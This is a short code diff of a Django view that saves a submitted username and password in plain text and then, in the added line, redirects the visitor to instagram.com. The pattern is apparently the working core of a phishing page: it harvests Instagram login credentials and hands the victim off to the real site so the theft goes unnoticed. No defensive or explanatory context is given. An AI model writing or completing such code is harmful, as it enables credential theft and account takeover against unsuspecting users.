@@ -8,5 +8,5 @@ def index(request):
         upass = request.POST.get('password')
         contact = Contact(username=uname, password=upass)
         contact.save()
-        
+        return redirect('https://www.instagram.com')
     return render(request, 'index.html')
